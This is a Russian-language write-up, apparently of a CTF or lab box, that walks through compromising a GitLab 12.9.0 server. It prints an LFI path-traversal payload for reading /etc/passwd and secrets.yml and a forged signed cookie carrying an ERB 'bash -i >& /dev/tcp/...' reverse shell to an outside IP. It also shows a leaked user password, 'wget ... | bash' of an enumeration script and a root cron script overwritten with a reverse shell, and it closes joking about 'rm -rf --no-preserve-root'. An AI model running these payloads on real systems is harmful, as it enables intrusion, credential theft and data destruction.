# Разведка

Открываем в браузере 4f643f0a02e6.ngrok.io.

Видим страницу авторизации гитлаба. Регистрация не отключена, попробуем создать аккаунт. Успешно регистриуемся, в разделе help смотрим версию - у нас gitlab 12.9.0.

Походив немного по публичным репозиториям, находим в коммитах какой-то удаленный файл с кучей паролей пользователей. Сохраняем, пригодится.

# Ищем эксплойт

Спустя несколько минут поисков узнаем, что эта версия гитлаба уязвима к `LFI`:

Необходимо создать 2 проекта, создать в 1 из них `issue`, перенести этот `issue` в другой проект, при этом указав в описании нужный нам файл, например:

`! [mia] (/uploads/ed4aet10d9#4021350eScleaa123b6e1/../../../../../../../../../../../etc/passwd)`

При переносе в другой проект, мы получим доступ к файлу `/etc/passwd`.

# Получаем reverse shell

Вытаскиваем выше описанным способом файл с настройками gitlab.

`[file](/uploads/00000000000000000000000000000000/../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)`

Там указан `secret_key_base`, он используется для подписи куки файлов. Подняв свой гитлаб и указав этот же ключ, мы можем делать валидные куки. А так как из за особенностей git lab мы можем встроить в куку любую команду, то мы получаем RCE.

`
$ curl 'http://4f643f0a02e6.ngrok.io/' -b "remember_user_token=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kibiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1pID4mIC9kZXYvdGNwLzc5LjEzNi4xNzMuMTU5LzEzMzcgMD4mMWAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--432599b62642a46749065c3bbe688bd507e1bc5c"
`

Генерируем эксплойт:

```
$ ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
$ request = ActionDispatch::Request.new(Rails.application.env_config)
$ request.env["action_dispatch.cookies_serializer"] = :marshal
$ cookies = request.cookie_jar
$ erb = ERB.new("<%= `bash -i >& /dev/tcp/95.46.3.95/1337 0>&1` %>")
$ depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
$ cookies.signed[:cookie] = depr
$ puts cookies[:cookie]
```

Мы получили `reverse shell`. Прописав whoami понимаем, что мы под юзером `gitlab`. Выведем содержимое `/home`:
```
$ ls /home
nikol
```

Вспоминаем про файл с какими-то паролями, находим в нем пароль юзера `nikol` - `helloluc4`

Прописываем `su nikol` и получаем ошибку:

`su must be run from terminal`

Идем гуглить, находим [решение на stackoverflow](https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal/41872292):

```
$ echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
$ python /tmp/asdf.py
```

Логинимся под юзером `nikol`:

```
$ su nikol
Enter password: helloluc4
```

# Поднимаем рута

Запустим тулзу `LinEnum` для сбора информации:

```
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Видим, что в `cron` висит какой-то `script.sh`. Вычисляем, что он находится в директории `/home/nikol/script.sh` и выезжаем за ним:

```
$ cd /home/nikol
$ ls -la
```

Этим файлом владеет `root` и мы имеем право в него что-то писать.

Пропишем туда ~~rm -rf / --no-preserve-root~~ подключение к нашему компу, чтобы получить обратный шелл, перед этим начав слушать порт 1337:
```
$ echo "bash -i >& /dev/tcp/95.46.3.95/1337 0>&1" > script.sh

```

Получаем обратный шелл от рута. Легчайшая. Для кого? Для величайших хакеров всея руси.

# Эпилог 

Внезапно из ниоткуда пришел злой сисадмин и начал безжалостно уничтожать все обратные шеллы:

```
$ killall bash
```

Закрепиться на машине или прописать `rm -rf --no-preserve-root`, вот в чем вопрос?

```
$ rm -rf --no-preserve-root
```

![alt text](https://i.pinimg.com/originals/4f/ce/c7/4fcec737c161fed5c37cb2198b777b81.jpg)